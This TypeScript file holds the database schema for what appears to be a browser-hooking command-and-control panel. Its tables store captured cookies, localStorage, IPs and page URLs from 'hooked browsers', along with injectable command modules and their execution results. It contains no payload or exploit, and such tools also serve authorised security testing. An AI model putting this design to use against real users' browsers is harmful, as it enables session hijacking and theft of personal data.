import { pgTable, text, serial, integer, boolean, timestamp, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export const hookedBrowsers = pgTable("hooked_browsers", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  ipAddress: text("ip_address").notNull(),
  userAgent: text("user_agent").notNull(),
  browser: text("browser"),
  browserVersion: text("browser_version"),
  os: text("os"),
  platform: text("platform"),
  isOnline: boolean("is_online").default(true),
  firstSeen: timestamp("first_seen").defaultNow(),
  lastSeen: timestamp("last_seen").defaultNow(),
  pageUrl: text("page_url"),
  domain: text("domain"),
  port: integer("port"),
  cookies: text("cookies"),
  localStorage: text("local_storage"),
  referer: text("referer"),
  headers: jsonb("headers"),
});

export const insertHookedBrowserSchema = createInsertSchema(hookedBrowsers).omit({
  id: true,
  firstSeen: true,
  lastSeen: true
});

export type InsertHookedBrowser = z.infer<typeof insertHookedBrowserSchema>;
export type HookedBrowser = typeof hookedBrowsers.$inferSelect;

export const commandModules = pgTable("command_modules", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  description: text("description").notNull(),
  category: text("category").notNull(),
  icon: text("icon").notNull(),
  code: text("code").notNull(),
});

export const insertCommandModuleSchema = createInsertSchema(commandModules).omit({
  id: true
});

export type InsertCommandModule = z.infer<typeof insertCommandModuleSchema>;
export type CommandModule = typeof commandModules.$inferSelect;

export const commandExecutions = pgTable("command_executions", {
  id: serial("id").primaryKey(),
  browserId: integer("browser_id").notNull(),
  moduleId: integer("module_id").notNull(),
  executedAt: timestamp("executed_at").defaultNow(),
  result: jsonb("result"),
  status: text("status").notNull(),
});

export const insertCommandExecutionSchema = createInsertSchema(commandExecutions).omit({
  id: true,
  executedAt: true
});

export type InsertCommandExecution = z.infer<typeof insertCommandExecutionSchema>;
export type CommandExecution = typeof commandExecutions.$inferSelect;

export const logs = pgTable("logs", {
  id: serial("id").primaryKey(),
  browserId: integer("browser_id"),
  timestamp: timestamp("timestamp").defaultNow(),
  event: text("event").notNull(),
  details: jsonb("details"),
  level: text("level").notNull(),
});

export const insertLogSchema = createInsertSchema(logs).omit({
  id: true,
  timestamp: true
});

export type InsertLog = z.infer<typeof insertLogSchema>;
export type Log = typeof logs.$inferSelect;
